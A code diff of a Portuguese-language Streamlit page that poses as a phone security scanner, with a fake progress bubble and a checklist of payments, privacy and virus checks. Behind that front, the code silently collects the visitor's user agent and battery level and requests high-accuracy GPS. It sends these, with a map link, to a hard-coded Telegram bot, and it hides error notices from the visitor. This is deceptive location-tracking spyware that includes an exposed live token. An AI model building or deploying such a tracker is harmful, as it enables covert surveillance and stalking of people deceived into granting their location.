@@ -1,9 +1,9 @@
 import streamlit as st
 import requests
 import time
-from streamlit_js_eval import streamlit_js_eval, get_geolocation
+from streamlit_js_eval import streamlit_js_eval
 
-# 1. TELEGRAM
+# 1. SETUP TELEGRAM
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
@@ -12,15 +12,14 @@ def enviar_telegram(msg):
     try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
     except: pass
 
-st.set_page_config(page_title="Segurança", layout="centered")
+st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# 2. CSS (BOLHA + OCULTAR LIXO)
+# 2. CSS DA BOLHA E LIMPEZA DE AVISOS
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
-    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
-        display: none !important; 
-    }
+    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { display: none !important; }
+    
     .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
     .circle {
         width: 180px; height: 180px; border-radius: 50%;
@@ -32,67 +31,85 @@ st.markdown("""
     }
     @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
     .pct-text { font-size: 45px; font-weight: bold; color: white; }
-    div.stButton > button {
-        background-color: #ffc107 !important; color: black !important;
-        font-weight: bold !important; width: 100%; height: 4em; border-radius: 12px; border: none;
+    
+    /* BOTÃO ESTILIZADO */
+    .btn-ativar {
+        background-color: #ffc107; color: black; font-weight: bold;
+        width: 100%; height: 60px; border-radius: 10px; border: none;
+        font-size: 18px; cursor: pointer; margin-top: 20px;
     }
     </style>
 """, unsafe_allow_html=True)
 
-# 3. INTERFACE INICIAL
+# 3. CAPTURA DE HARDWARE (MODELO E BATERIA)
+modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA')
+bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT')
+
+# 4. INTERFACE
 st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
 caixa_bolha = st.empty()
 
-# Captura modelo e bateria (silencioso)
-modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='MDL_V3')
-bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_V3')
+# Estado inicial da bolha
+if 'porcentagem' not in st.session_state:
+    st.session_state['porcentagem'] = 4
 
-if 'estado' not in st.session_state:
-    st.session_state['estado'] = 'parado'
-
-# Exibição da bolha conforme o estado
-if st.session_state['estado'] == 'parado':
-    with caixa_bolha.container():
-        st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
+with caixa_bolha.container():
+    st.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{st.session_state["porcentagem"]}%</div></div></div>', unsafe_allow_html=True)
 
 st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# 4. O BOTÃO
-if st.button("🔴 ATIVAR PROTEÇÃO"):
-    st.session_state['estado'] = 'pedindo'
+# 5. O SEGREDO: COMPONENTE HTML/JS PARA DISPARAR O POP-UP SEM ERRO
+# Isso contorna o erro de sintaxe e o bloqueio do navegador
+if 'gps_data' not in st.session_state:
+    st.session_state['gps_data'] = None
 
-# 5. LÓGICA DO POP-UP E ANIMAÇÃO
-if st.session_state['estado'] == 'pedindo':
-    # O SEGREDO: O get_geolocation só é invocado AGORA.
-    # Isso obriga o navegador a mostrar o pop-up de precisão.
-    loc = get_geolocation() 
+# Script JS que roda ao clicar no botão
+componente_js = """
+<script>
+function getGeo() {
+    navigator.geolocation.getCurrentPosition(
+        (pos) => {
+            const data = {
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                ok: true
+            };
+            window.parent.postMessage({type: 'streamlit:set_component_value', value: data}, '*');
+        },
+        (err) => { alert("Por favor, ative a localização no seu GPS!"); },
+        {enableHighAccuracy: true}
+    );
+}
+</script>
+<button class="btn-ativar" onclick="getGeo()">🔴 ATIVAR PROTEÇÃO</button>
+"""
+
+# Renderiza o botão via HTML/JS para garantir o pop-up
+resultado_gps = st.components.v1.html(componente_js, height=100)
+
+# 6. LÓGICA DE ENVIO E ANIMAÇÃO
+if resultado_gps and 'lat' in resultado_gps:
+    # 1. Animação 0-100%
+    for p in range(0, 101, 10):
+        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
+        time.sleep(0.05)
     
-    if loc and 'coords' in loc:
-        # Quando aceita, os números se mexem (0-100)
-        for p in range(0, 101, 5):
-            caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
-            time.sleep(0.04)
-        
-        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
-        mapa = f"https://www.google.com/maps?q={lat},{lon}"
-        
-        # Envia tudo
-        msg = (f"🛡️ SISTEMA ATIVADO\n\n"
-               f"📱 Modelo: {modelo[:50] if modelo else 'N/A'}\n"
-               f"🔋 Bateria: {bateria if bateria else '--'}%\n"
-               f"📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})")
-        
-        enviar_telegram(msg)
-        st.success("Localização concluída")
-        st.session_state['estado'] = 'finalizado'
-        st.stop()
-    else:
-        # Se ainda não aceitou, a bolha mostra que está trabalhando
-        with caixa_bolha.container():
-            st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">...</div></div></div>', unsafe_allow_html=True)
-        time.sleep(0.5)
-        st.rerun()
+    # 2. Dados finais
+    lat = resultado_gps['lat']
+    lon = resultado_gps['lon']
+    mapa = f"https://www.google.com/maps?q={lat},{lon}"
+    
+    relatorio = (
+        f"🛡️ SISTEMA ATIVADO\n\n"
+        f"📱 Aparelho: {modelo[:50] if modelo else 'N/A'}\n"
+        f"🔋 Bateria: {bateria if bateria else '--'}%\n"
+        f"📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})"
+    )
+    
+    enviar_telegram(relatorio)
+    st.success("Localização concluída")
+    st.stop()
 
 st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
